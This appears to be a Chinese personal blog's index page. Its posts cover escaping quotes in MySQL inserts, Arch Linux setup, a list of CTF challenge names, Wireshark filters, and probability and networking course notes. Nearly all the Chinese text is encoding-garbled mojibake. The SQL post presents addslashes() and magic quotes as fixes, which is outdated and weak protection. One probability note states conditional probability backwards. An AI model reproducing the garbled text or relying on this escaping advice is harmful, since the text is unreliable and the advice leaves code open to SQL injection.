<h3 id="mysqlå•å¼•å·å’ŒåŒå¼•å·"><a href="#mysqlå•å¼•å·å’ŒåŒå¼•å·" class="headerlink" title="mysqlå•å¼•å·å’ŒåŒå¼•å·"></a>mysqlå•å¼•å·å’ŒåŒå¼•å·</h3><p>è¿™æ˜¯ä¼šç»å¸¸é‡åˆ°çš„é—®é¢˜ï¼Œåœ¨æ’å…¥æ•°æ®åº“çš„SQLè¯­å¥æ˜¯é‡‡ç”¨å•å¼•å·æ¥å®šä¹‰å­—ç¬¦ä¸²ï¼Œå¦‚æœè¦å°†ä¸€ä¸ªå«æœ‰å•å¼•å·çš„å­—ç¬¦ä¸²æ’å…¥æ•°æ®åº“ï¼Œè¿™ä¸ªSQLè¯­å¥å°±ä¼šå‡ºé”™ã€‚</p>
<p>å¦‚ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql&#x3D;&quot;insert into userinfo (username,password) Values(&#39;O&#39;Kefee&#39;,&#39;123456&#39;)&quot;</span><br></pre></td></tr></table></figure>

<p>å¤„ç†çš„æ–¹æ³•ä¸€ï¼šæ˜¯åœ¨SQLè¯­å¥ä¸­åŠ å…¥è½¬ä¹‰ç¬¦åæ–œçº¿ï¼Œ</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">â€¦â€¦Values(&#39;O\&#39;Kefee&#39;,â€¦â€¦</span><br></pre></td></tr></table></figure>

<p>å¤„ç†çš„æ–¹æ³•äºŒï¼šå¯ä»¥ä½¿ç”¨å‡½æ•° <strong>addslashes()</strong>ï¼Œè¯¥å‡½æ•°çš„åŠŸèƒ½å°±æ˜¯åŠ å…¥è½¬ä¹‰ç¬¦ï¼Œ</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$s &#x3D; addslashes(&quot;O&#39;Kefee&quot;) â€¦â€¦Values(&#39;&quot;.$s.&quot;&#39;,â€¦â€¦</span><br></pre></td></tr></table></figure>

<p>å¤„ç†çš„æ–¹æ³•ä¸‰ï¼šè®¾ç½®php.iniä¸­çš„<strong>magic-quotes</strong>é€‰é¡¹ï¼Œæ‰“å¼€è¯¥é€‰é¡¹ï¼Œåˆ™é€šè¿‡è¡¨å•æäº¤çš„ä¿¡æ¯ä¸­å¦‚æœæœ‰å•å¼•å·æ˜¯ï¼Œå°†ä¼šè‡ªåŠ¨åŠ ä¸Šå¦‚è½¬ä¹‰ç¬¦ã€‚å› æ­¤ä¸ç”¨ä½¿ç”¨å…¶ä»–å‡½æ•°äº†ã€‚</p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/03/15/arch%E5%AE%89%E8%A3%85/">archå®‰è£…</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-03-15</time><div class="content"><p>é…ç½®ç½‘ç»œï¼š</p>
<p>å½“æ—¶<code>ping 8.8.8.8</code>é€Ÿåº¦å¾ˆå¿«ï¼Œä½†æ˜¯<code>ping baidu.com</code>å®Œå…¨pingä¸é€šï¼Œæ€è€ƒæ˜¯DNSæœåŠ¡å™¨ä¸å¤ªè¡Œï¼Œäºæ˜¯ä¸Šç½‘æœäº†é˜¿é‡Œçš„DNS Serverï¼š223.5.5.5ï¼Œæ”¹/etc/resolv.confé‡Œçš„nameserverã€‚ä¹‹åè™½ç„¶pingé€šäº†ï¼Œä½†æ˜¯å¾ˆæ…¢è€Œä¸”ä¸¢åŒ…ç‡60%ï¼Œæ€è€ƒå¾ˆå¯èƒ½æ˜¯å­¦æ ¡çš„æœ‰çº¿ç½‘å¤ªæ…¢äº†ï¼Œäºæ˜¯å°±æ‰‹æœºUSBè¿äº†ç”µè„‘ç„¶åå¼€å¯USBå…±äº«çƒ­ç‚¹ã€‚é€Ÿåº¦å˜å¿«äº†ï¼Œå°±å¯ä»¥ä¸‹è½½è½¯ä»¶åŒ…äº†ï¼ˆå°±æ˜¯ç”¨çš„æµé‡åŠå…¶è‚‰ç–¼ï¼‰</p>
<p>é‡å¯ï¼š</p>
<p>é‡å¯ä¹‹ååˆ›å»ºçš„ä¸€äº›æ–‡ä»¶å’Œæ›´æ”¹çš„ä¸€äº›æ–‡ä»¶ï¼Œä»¥åŠä½ å¯¹ç£ç›˜çš„æŒ‚è½½éƒ½ä¼šæ¶ˆå¤±ï¼Œæ‰€ä»¥è®°å¾—å†æ¬¡æŒ‚è½½ï¼Œä¸ç„¶è½¯ä»¶å®‰è£…ä¼šå‡ºé—®é¢˜ã€‚</p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/03/10/ctf%E9%A2%98%E7%9B%AE%E5%88%86%E7%B1%BB%E6%80%BB%E7%BB%93/">ctfé¢˜ç›®åˆ†ç±»æ€»ç»“</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-03-10</time><div class="content"><h1 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h1><h2 id="SSTIæ¨¡æ¿æ³¨å…¥"><a href="#SSTIæ¨¡æ¿æ³¨å…¥" class="headerlink" title="SSTIæ¨¡æ¿æ³¨å…¥"></a>SSTIæ¨¡æ¿æ³¨å…¥</h2><ol>
<li>[WesternCTF2018]shrine</li>
</ol>
<h1 id="php"><a href="#php" class="headerlink" title="php"></a>php</h1><h2 id="ååºåˆ—åŒ–"><a href="#ååºåˆ—åŒ–" class="headerlink" title="ååºåˆ—åŒ–"></a>ååºåˆ—åŒ–</h2><ol>
<li>[å®‰æ´µæ¯ 2019]easy_serialize_php</li>
<li>[0CTF 2016]piapiapia</li>
</ol>
<h2 id="ç»•è¿‡"><a href="#ç»•è¿‡" class="headerlink" title="ç»•è¿‡"></a>ç»•è¿‡</h2><h3 id="æ•°å€¼ä¸å­—ç¬¦ä¸²"><a href="#æ•°å€¼ä¸å­—ç¬¦ä¸²" class="headerlink" title="æ•°å€¼ä¸å­—ç¬¦ä¸²"></a>æ•°å€¼ä¸å­—ç¬¦ä¸²</h3><ol>
<li>[WUSTCTF2020]æœ´å®æ— å</li>
</ol>
<h3 id="md5"><a href="#md5" class="headerlink" title="md5"></a>md5</h3><ol>
<li>[WUSTCTF2020]æœ´å®æ— å</li>
</ol>
<h3 id="system-æ‰§è¡Œçš„ç»•è¿‡"><a href="#system-æ‰§è¡Œçš„ç»•è¿‡" class="headerlink" title="system()æ‰§è¡Œçš„ç»•è¿‡"></a>system()æ‰§è¡Œçš„ç»•è¿‡</h3><ol>
<li>[WUSTCTF2020]æœ´å®æ— å</li>
</ol>
<h1 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h1><ol>
<li>[SWPU2019]Web1ã€è¿‡æ»¤ç©ºæ ¼ï¼Œorï¼Œæ³¨é‡Šç¬¦ã€‘</li>
</ol>
<h2 id="ç™»å½•æ¡†æ³¨å…¥"><a href="#ç™»å½•æ¡†æ³¨å…¥" class="headerlink" title="ç™»å½•æ¡†æ³¨å…¥"></a>ç™»å½•æ¡†æ³¨å…¥</h2><ol>
<li>[BJDCTF 2nd]ç®€å•æ³¨å…¥ã€å¼•å·é€ƒé€¸ï¼ˆè¿‡æ»¤selectå’Œå•åŒå¼•å·ï¼‰ã€‘</li>
</ol>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/03/08/wireshark%E4%BD%BF%E7%94%A8/">wiresharkä½¿ç”¨</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-03-08</time><div class="content"><h2 id="ä¸€äº›å¸¸ç”¨æŒ‡ä»¤"><a href="#ä¸€äº›å¸¸ç”¨æŒ‡ä»¤" class="headerlink" title="ä¸€äº›å¸¸ç”¨æŒ‡ä»¤"></a>ä¸€äº›å¸¸ç”¨æŒ‡ä»¤</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http.request.method&#x3D;&#x3D;POST</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http contains &quot;flag&quot;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>





<p><a href="https://www.cnblogs.com/jiugao/p/11644508.html" target="_blank" rel="noopener">wiresharkåŸºç¡€åŠŸèƒ½</a></p>
<p><a href="https://blog.csdn.net/vhkjhwbs/article/details/103605892" target="_blank" rel="noopener">wiresharkæœ‰å…³é¢˜å‹æ€»ç»“</a></p>
<h2 id="è¿‡æ»¤å™¨"><a href="#è¿‡æ»¤å™¨" class="headerlink" title="è¿‡æ»¤å™¨"></a>è¿‡æ»¤å™¨</h2><h3 id="æŠ“åŒ…è¿‡æ»¤å™¨"><a href="#æŠ“åŒ…è¿‡æ»¤å™¨" class="headerlink" title="æŠ“åŒ…è¿‡æ»¤å™¨"></a>æŠ“åŒ…è¿‡æ»¤å™¨</h3><p><img src="/2021/03/08/wireshark%E4%BD%BF%E7%94%A8/1.png" alt="1"></p>
<h3 id="æ˜¾ç¤ºè¿‡æ»¤å™¨"><a href="#æ˜¾ç¤ºè¿‡æ»¤å™¨" class="headerlink" title="æ˜¾ç¤ºè¿‡æ»¤å™¨"></a>æ˜¾ç¤ºè¿‡æ»¤å™¨</h3><p><img src="/2021/03/08/wireshark%E4%BD%BF%E7%94%A8/2.png" alt="2"></p>
<h2 id="éƒ¨åˆ†åŠŸèƒ½"><a href="#éƒ¨åˆ†åŠŸèƒ½" class="headerlink" title="éƒ¨åˆ†åŠŸèƒ½"></a>éƒ¨åˆ†åŠŸèƒ½</h2><p>ç»Ÿè®¡-&gt;conversationï¼šçœ‹æŸä¸€ä¸ªå…·ä½“ipæœ‰å…³çš„åŒ…</p>
<p>ç»Ÿè®¡-&gt;åè®®åˆ†çº§ï¼šçœ‹åè®®çš„å æ¯”</p>
<p><img src="/2021/03/08/wireshark%E4%BD%BF%E7%94%A8/3.png" alt="3"></p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/03/02/%E5%A4%A7%E4%BA%8C%E4%B8%8B/">å¤§äºŒä¸‹</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-03-02</time><div class="content"><h1 id="æ¦‚ç‡è®º"><a href="#æ¦‚ç‡è®º" class="headerlink" title="æ¦‚ç‡è®º"></a>æ¦‚ç‡è®º</h1><h2 id="éšæœºäº‹ä»¶åŠå…¶æ¦‚ç‡"><a href="#éšæœºäº‹ä»¶åŠå…¶æ¦‚ç‡" class="headerlink" title="éšæœºäº‹ä»¶åŠå…¶æ¦‚ç‡"></a>éšæœºäº‹ä»¶åŠå…¶æ¦‚ç‡</h2><h3 id="åŸºæœ¬æ¦‚å¿µ"><a href="#åŸºæœ¬æ¦‚å¿µ" class="headerlink" title="åŸºæœ¬æ¦‚å¿µ"></a>åŸºæœ¬æ¦‚å¿µ</h3><p>æ ·æœ¬ç©ºé—´ï¼ˆSï¼‰ï¼šå®éªŒEæ‰€æœ‰å¯èƒ½ç»“æœç»„æˆçš„é›†åˆ<br>æ ·æœ¬ç‚¹ï¼šEçš„æ¯ä¸ªç»“æœ</p>
<p>éšæœºäº‹ä»¶ï¼ˆç®€ç§°äº‹ä»¶ï¼‰ï¼šæ ·æœ¬ç©ºé—´Sçš„å­é›†ä¸ºEçš„éšæœºäº‹ä»¶<br>åŸºæœ¬äº‹ä»¶ï¼šç”±ä¸€ä¸ªæ ·æœ¬ç‚¹ç»„æˆçš„å•ç‚¹é›†</p>
<h3 id="äº‹ä»¶é—´çš„å…³ç³»"><a href="#äº‹ä»¶é—´çš„å…³ç³»" class="headerlink" title="äº‹ä»¶é—´çš„å…³ç³»"></a>äº‹ä»¶é—´çš„å…³ç³»</h3><p>äº‹ä»¶B<strong>åŒ…å«</strong>äº‹ä»¶Aï¼šäº‹ä»¶Aå‘ç”Ÿå¿…ç„¶å¯¼è‡´äº‹ä»¶Bå‘ç”Ÿ</p>
<p>AåŒ…å«Bä¸”BåŒ…å«Aï¼šAå’ŒB<strong>ç›¸ç­‰</strong></p>
<p>Aå’ŒBçš„<strong>å’Œäº‹ä»¶</strong>ï¼šå½“ä¸”ä»…å½“Aã€Bä¸­è‡³å°‘æœ‰ä¸€ä¸ªå‘ç”Ÿ</p>
<p>Aå’ŒBçš„<strong>ç§¯äº‹ä»¶</strong>ï¼šå½“ä¸”ä»…å½“Aã€Béƒ½å‘ç”Ÿçš„æ—¶å€™</p>
<p>B-Aï¼ˆBå’ŒAçš„<strong>å·®äº‹ä»¶</strong>ï¼‰ï¼šå½“ä¸”ä»…å½“Bå‘ç”Ÿä¸”Aä¸å‘ç”Ÿæ—¶</p>
<p>Aâˆ©B=ç©ºé›†ï¼šAå’ŒBæ˜¯<strong>äº’æ–¥ã€äº’ä¸ç›¸å®¹</strong>çš„</p>
<p>AâˆªB=Sä¸”Aâˆ©B=ç©ºé›†ï¼šAå’ŒBäº’ä¸º<strong>å¯¹ç«‹äº‹ä»¶ï¼ˆäº’æ–¥äº‹ä»¶ï¼‰</strong></p>
<p>å¾·æ‘©æ ¹å®šå¾‹ï¼š</p>
<p><img src="https://bkimg.cdn.bcebos.com/formula/6b67bfad2cc2b10d0c4ab79acd198788.svg" alt="img"></p>
<p><img src="https://bkimg.cdn.bcebos.com/formula/e30ab8539128e4bb9e6591efdc961624.svg" alt="img"></p>
<blockquote>
<p>æ³¨ï¼šæ¦‚ç‡è®ºä¸­ï¼Œéçš„ç¬¦å·æ˜¯åœ¨Pã€Qä¸Šç”»æ¨ªçº¿ï¼›å¹¶ä½¿âˆªï¼Œäº¤æ˜¯âˆ©</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rn(A) &#x3D; fA&#x2F;n</span><br></pre></td></tr></table></figure>

<p>Rn(A)ä¸ºäº‹ä»¶Aåœ¨næ¬¡è¯•éªŒä¸­å‘ç”Ÿçš„<strong>é¢‘ç‡</strong></p>
<h3 id="é¢‘ç‡å’Œæ¦‚ç‡çš„å‡ æ¡æ€§è´¨"><a href="#é¢‘ç‡å’Œæ¦‚ç‡çš„å‡ æ¡æ€§è´¨" class="headerlink" title="é¢‘ç‡å’Œæ¦‚ç‡çš„å‡ æ¡æ€§è´¨"></a>é¢‘ç‡å’Œæ¦‚ç‡çš„å‡ æ¡æ€§è´¨</h3><p>è‹¥Aã€Bäº’ä¸ç›¸å®¹ï¼Œåˆ™</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rn(AâˆªB)&#x3D;Rn(A)+Rn(B)</span><br></pre></td></tr></table></figure>



<p>è‹¥Aå±äºBï¼Œåˆ™</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">P(B-A)&#x3D;P(B)-P(A)</span><br><span class="line">P(B)&gt;&#x3D;P(A)</span><br></pre></td></tr></table></figure>



<p>åŠ æ³•å…¬å¼ï¼šå¯¹äºä»»æ„ä¸¤äº‹ä»¶Aã€Bã€ABå°±æ˜¯Aâˆ©Bã€‘</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">P(AâˆªB)&#x3D;P(A)+P(B)-P(AB)</span><br></pre></td></tr></table></figure>



<p>é™¤æ­¤ä»¥å¤–ï¼Œè¿˜æ»¡è¶³<strong>äº¤æ¢å¾‹</strong>ã€<strong>ç»“åˆå¾‹</strong>ã€<strong>åˆ†é…å¾‹</strong>å’Œ<strong>å¾·æ‘©æ ¹å®šå¾‹</strong></p>
<h3 id="æ¡ä»¶æ¦‚ç‡"><a href="#æ¡ä»¶æ¦‚ç‡" class="headerlink" title="æ¡ä»¶æ¦‚ç‡"></a>æ¡ä»¶æ¦‚ç‡</h3><h4 id="æ¡ä»¶æ¦‚ç‡-1"><a href="#æ¡ä»¶æ¦‚ç‡-1" class="headerlink" title="æ¡ä»¶æ¦‚ç‡"></a>æ¡ä»¶æ¦‚ç‡</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">P(A|B) &#x3D; P(AB)&#x2F;P(B)</span><br></pre></td></tr></table></figure>

<p>P(A|B)ç›¸å½“äºåœ¨Açš„æ¡ä»¶ä¸‹å‘ç”ŸBçš„æ¦‚ç‡ï¼ŒP(B)å³æ€»çš„Bçš„å‘ç”Ÿæ€»æ•°ï¼Œè€ŒP(AB)å³å‘ç”ŸBåŒæ—¶Aä¹Ÿå‘ç”Ÿçš„æ€»æ•°ã€‚</p>
<h4 id="ä¹˜æ³•å…¬å¼"><a href="#ä¹˜æ³•å…¬å¼" class="headerlink" title="ä¹˜æ³•å…¬å¼"></a>ä¹˜æ³•å…¬å¼</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">P(AB) &#x3D; P(A|B)*P(B)</span><br></pre></td></tr></table></figure>



<h4 id="å…¨æ¦‚ç‡å…¬å¼å’Œè´å¶æ–¯å…¬å¼"><a href="#å…¨æ¦‚ç‡å…¬å¼å’Œè´å¶æ–¯å…¬å¼" class="headerlink" title="å…¨æ¦‚ç‡å…¬å¼å’Œè´å¶æ–¯å…¬å¼"></a>å…¨æ¦‚ç‡å…¬å¼å’Œè´å¶æ–¯å…¬å¼</h4><h5 id="åˆ’åˆ†ï¼š"><a href="#åˆ’åˆ†ï¼š" class="headerlink" title="åˆ’åˆ†ï¼š"></a>åˆ’åˆ†ï¼š</h5><p>è®¾Sä¸ºè¯•éªŒEçš„æ ·æœ¬ç©ºé—´ï¼ŒB1ã€B2ã€â€¦Bnä¸ºEçš„ä¸€ç»„äº‹ä»¶ï¼Œè‹¥</p>
<p>1ã€ä»»æ„ä¸¤ä¸ªBæ— äº¤é›†<br>2ã€B1âˆªB2âˆªâ€¦âˆªBn = S</p>
<p>åˆ™ç§°äº‹ä»¶ç»„B1ã€B2ã€â€¦Bnä¸ºæ ·æœ¬ç©ºé—´Sçš„ä¸€ä¸ª<strong>åˆ’åˆ†</strong></p>
<h5 id="å…¨æ¦‚ç‡å…¬å¼ï¼šï¼ˆBnæ˜¯åˆ’åˆ†ï¼‰"><a href="#å…¨æ¦‚ç‡å…¬å¼ï¼šï¼ˆBnæ˜¯åˆ’åˆ†ï¼‰" class="headerlink" title="å…¨æ¦‚ç‡å…¬å¼ï¼šï¼ˆBnæ˜¯åˆ’åˆ†ï¼‰"></a>å…¨æ¦‚ç‡å…¬å¼ï¼šï¼ˆBnæ˜¯åˆ’åˆ†ï¼‰</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p(A) &#x3D; P(A|B1)P(B1) + ... + P(A|Bn)P(Bn)</span><br></pre></td></tr></table></figure>

<p>å³</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p(A) &#x3D; P(AB1) + ... + P(ABn)</span><br></pre></td></tr></table></figure>

<p>n=2æ—¶â€¦</p>
<h5 id="è´å¶æ–¯å…¬å¼"><a href="#è´å¶æ–¯å…¬å¼" class="headerlink" title="è´å¶æ–¯å…¬å¼"></a>è´å¶æ–¯å…¬å¼</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">P(Bi|A)</span><br><span class="line">&#x3D; P(ABi) &#x2F; P(A)</span><br><span class="line">&#x3D; P(A|Bi)P(Bi) &#x2F; Î£P(A|Bj)P(Bj)</span><br></pre></td></tr></table></figure>

<p>n=2æ—¶â€¦</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x3D; P(A|Bi)P(Bi) &#x2F; P(A|B)P(B) + P(A|éB)P(éB)</span><br></pre></td></tr></table></figure>





<h3 id="äº‹ä»¶çš„ç‹¬ç«‹æ€§"><a href="#äº‹ä»¶çš„ç‹¬ç«‹æ€§" class="headerlink" title="äº‹ä»¶çš„ç‹¬ç«‹æ€§"></a>äº‹ä»¶çš„ç‹¬ç«‹æ€§</h3><p>è‹¥<code>P(AB) = P(A)*P(B)</code>,åˆ™ç§°Aäº‹ä»¶ä¸Bäº‹ä»¶<strong>ç‹¬ç«‹</strong>ã€‚</p>
<p><strong>å®šç†ï¼š</strong>è‹¥Aä¸Bç‹¬ç«‹ï¼Œåˆ™Aä¸éBï¼ŒéAä¸Bï¼ŒéAä¸éBä¹Ÿç›¸äº’ç‹¬ç«‹ã€‚</p>
<h1 id="è®¡ç®—æœºç½‘ç»œ"><a href="#è®¡ç®—æœºç½‘ç»œ" class="headerlink" title="è®¡ç®—æœºç½‘ç»œ"></a>è®¡ç®—æœºç½‘ç»œ</h1><h3 id="æ¦‚è¿°"><a href="#æ¦‚è¿°" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h3><p>ISPå…¨ç§° (Internet Service Provider)å³â€œäº’è”ç½‘æœåŠ¡æä¾›å•†â€ï¼Œå³å‘å¹¿å¤§ç”¨æˆ·ç»¼åˆæä¾›äº’è”ç½‘æ¥å…¥ä¸šåŠ¡ã€ä¿¡æ¯ä¸šåŠ¡ã€å’Œå¢å€¼ä¸šåŠ¡çš„ç”µä¿¡è¿è¥å•†ã€‚</p>
<h4 id="è®¡ç®—æœºç½‘ç»œçš„æ€§èƒ½æŒ‡æ ‡"><a href="#è®¡ç®—æœºç½‘ç»œçš„æ€§èƒ½æŒ‡æ ‡" class="headerlink" title="è®¡ç®—æœºç½‘ç»œçš„æ€§èƒ½æŒ‡æ ‡"></a>è®¡ç®—æœºç½‘ç»œçš„æ€§èƒ½æŒ‡æ ‡</h4><p>é€Ÿç‡ï¼ˆbits/sï¼‰ï¼šå¾€å¾€æŒ‡çš„æ˜¯<strong>é¢å®šé€Ÿç‡</strong>æˆ–æ ‡ç§°é€Ÿç‡ï¼Œè€Œéå®é™…é€Ÿç‡ã€‚<br>å¸¦å®½ï¼ˆbits/sï¼‰ï¼š<strong>æœ€é«˜</strong>æ•°æ®ç‡<br>ååé‡ï¼ˆbits/sï¼‰ï¼šå•ä½æ—¶é—´å†…é€šè¿‡æŸä¸ªç½‘ç»œçš„<strong>å®é™…æ•°æ®é‡</strong>ã€‚<br>æ—¶å»¶ï¼š</p>
<ol>
<li>å‘é€æ—¶å»¶ï¼ˆæ•°æ®å¸§é•¿åº¦/å‘é€é€Ÿç‡ï¼‰ï¼š</li>
<li>ä¼ æ’­æ—¶å»¶ï¼ˆä¿¡é“é•¿åº¦/ç”µç£æ³¢åœ¨ä¿¡é“ä¸Šçš„ä¼ æ’­é€Ÿç‡ï¼‰ï¼š</li>
<li>å¤„ç†æ—¶å»¶ï¼šä¸»æœºæˆ–è·¯ç”±å™¨æ”¶åˆ°åˆ†ç»„æ—¶è¦èŠ±ä¸€æ®µæ—¶é—´å¤„ç†</li>
<li>æ’é˜Ÿæ—¶å»¶ï¼šåˆ†ç»„è¿›å…¥è·¯ç”±å™¨åè¦å…ˆåœ¨è¾“å…¥é˜Ÿåˆ—æ’é˜Ÿç­‰å€™</li>
</ol>
<p>æ—¶å»¶å¸¦å®½ç§¯ï¼ˆbitï¼‰(=ä¼ æ’­æ—¶å»¶[s]*å¸¦å®½[bits/s]ï¼‰ï¼šå·²ç»å‘é€å‡ºå»ä½†æ˜¯è¿˜æ²¡æœ‰åˆ°çš„æ•°æ®ã€‚<br>å¾€è¿”æ—¶é—´RTTï¼š<br>åˆ©ç”¨ç‡ï¼šç½‘ç»œåˆ©ç”¨ç‡å¢åŠ æ—¶ï¼Œæ—¶å»¶ä¼šæ€¥å‰§å¢åŠ ã€‚</p>
<h4 id="ç½‘ç»œäº”å±‚ç»“æ„"><a href="#ç½‘ç»œäº”å±‚ç»“æ„" class="headerlink" title="ç½‘ç»œäº”å±‚ç»“æ„"></a>ç½‘ç»œäº”å±‚ç»“æ„</h4><ol>
<li>åº”ç”¨å±‚<br>åè®®ï¼šDNSï¼ŒHTTPï¼ŒSMTP(ç”µå­é‚®ä»¶)<br>åº”ç”¨å±‚äº¤äº’çš„æ•°æ®å•å…ƒï¼šæŠ¥æ–‡<br>ä»»åŠ¡ï¼šé€šè¿‡<strong>åº”ç”¨è¿›ç¨‹é—´çš„äº¤äº’</strong>æ¥å®Œæˆç‰¹å®š<strong>ç½‘ç»œåº”ç”¨</strong><br>å®šä¹‰ï¼šåº”ç”¨è¿›ç¨‹é—´é€šä¿¡å’Œäº¤äº’çš„è§„åˆ™</li>
<li>ä¼ è¾“å±‚/è¿è¾“å±‚ï¼ˆTransportï¼‰<br>åè®®ï¼šTCPï¼ŒUDP<br>ä»»åŠ¡ï¼šå‘ä¸¤å°ä¸»æœºä¸­<strong>è¿›ç¨‹ä¹‹é—´çš„é€šä¿¡</strong>æä¾›<strong>é€šç”¨çš„æ•°æ®ä¼ è¾“æœåŠ¡</strong><br>å®šä¹‰ï¼šä¸»æœºè¿›ç¨‹ä¹‹é—´é€šä¿¡çš„è§„åˆ™</li>
<li>ç½‘ç»œå±‚<br>åè®®ï¼šIP<br>ç½‘ç»œå±‚äº¤äº’çš„æ•°æ®å•å…ƒï¼šæŠŠ<strong>è¿è¾“å±‚</strong>äº§ç”Ÿçš„<u>æŠ¥æ–‡æ®µ</u>æˆ–<u>ç”¨æˆ·æ•°æ®æŠ¥</u>å°è£…æˆ<strong>åˆ†ç»„</strong>æˆ–<strong>åŒ…</strong><br>ä»»åŠ¡ï¼šä¸ºåˆ†ç»„äº¤æ¢ç½‘ä¸Š<strong>(é€šè¿‡è·¯ç”±å™¨ç»„æˆçš„ç½‘ç»œ)</strong>çš„ä¸åŒ<strong>ä¸»æœº</strong>æä¾›é€šä¿¡æœåŠ¡</li>
<li>æ•°æ®é“¾è·¯å±‚ï¼ˆdata linkï¼‰<br>é“¾è·¯å±‚äº¤äº’çš„æ•°æ®å•å…ƒï¼šå°†<strong>IPæ•°æ®æŠ¥</strong>ç»„è£…æˆ<strong>å¸§</strong><br>ä»»åŠ¡ï¼šåœ¨ä¸¤ä¸ªç›¸é‚»èŠ‚ç‚¹é—´çš„é“¾è·¯ä¸Šä¼ é€<strong>å¸§</strong>ï¼›æ£€æµ‹æ‰€æ”¶åˆ°çš„å¸§é‡Œæœ‰æ— å·®é”™ï¼Œ<strong>ä¸¢å¼ƒ</strong>å‡ºå·®é”™çš„å¸§ï¼›è¯¥å±‚è¿˜æœ‰ä¸€äº›åè®®å¯ä»¥æ”¹æ­£å·®é”™<br>æ³¨æ„ï¼šè¯¥å±‚ä¿¡æ¯è¢«åˆ†ä¸ºä¸¤éƒ¨åˆ†ï¼ŒåŠ åˆ°é¦–éƒ¨å’Œå°¾éƒ¨</li>
<li>ç‰©ç†å±‚<br>ç‰©ç†å±‚äº¤äº’çš„æ•°æ®å•å…ƒï¼šæ¯”ç‰¹</li>
</ol>
<h3 id="ç‰©ç†å±‚"><a href="#ç‰©ç†å±‚" class="headerlink" title="ç‰©ç†å±‚"></a>ç‰©ç†å±‚</h3><h4 id="å¯¼å¼•å‹ä¼ è¾“åª’ä½“"><a href="#å¯¼å¼•å‹ä¼ è¾“åª’ä½“" class="headerlink" title="å¯¼å¼•å‹ä¼ è¾“åª’ä½“"></a>å¯¼å¼•å‹ä¼ è¾“åª’ä½“</h4><ol>
<li><p>åŒç»çº¿ï¼šå±è”½åŒç»çº¿ï¼›æ— å±è”½åŒç»çº¿ã€‚</p>
</li>
<li><p>åŒè½´ç”µç¼†</p>
</li>
<li><p>å…‰ç¼†ï¼šæŸè€—å°ã€ä¿å¯†æ€§å¥½ã€é‡é‡è½»</p>
</li>
</ol>
<h4 id="éå¯¼å¼•å‹ä¼ è¾“åª’ä½“"><a href="#éå¯¼å¼•å‹ä¼ è¾“åª’ä½“" class="headerlink" title="éå¯¼å¼•å‹ä¼ è¾“åª’ä½“"></a>éå¯¼å¼•å‹ä¼ è¾“åª’ä½“</h4><ol>
<li>å¾®æ³¢æ¥åŠ›é€šä¿¡</li>
<li>å«æ˜Ÿé€šä¿¡</li>
</ol>
<h4 id="ä¿¡é“å¤ç”¨æŠ€æœ¯"><a href="#ä¿¡é“å¤ç”¨æŠ€æœ¯" class="headerlink" title="ä¿¡é“å¤ç”¨æŠ€æœ¯"></a>ä¿¡é“å¤ç”¨æŠ€æœ¯</h4><ol>
<li>é¢‘åˆ†å¤ç”¨ï¼šåœ¨åŒæ ·çš„æ—¶é—´å ç”¨ä¸åŒçš„é¢‘å¸¦å¸¦å®½èµ„æº</li>
<li>æ—¶åˆ†å¤ç”¨ï¼šåœ¨ä¸åŒçš„æ—¶é—´å ç”¨åŒæ ·çš„é¢‘å¸¦å®½åº¦ã€å‡çº§ç‰ˆï¼šç»Ÿè®¡æ—¶åˆ†å¤ç”¨ã€‘</li>
<li>æ³¢åˆ†å¤ç”¨ï¼šå…‰çš„é¢‘åˆ†å¤ç”¨</li>
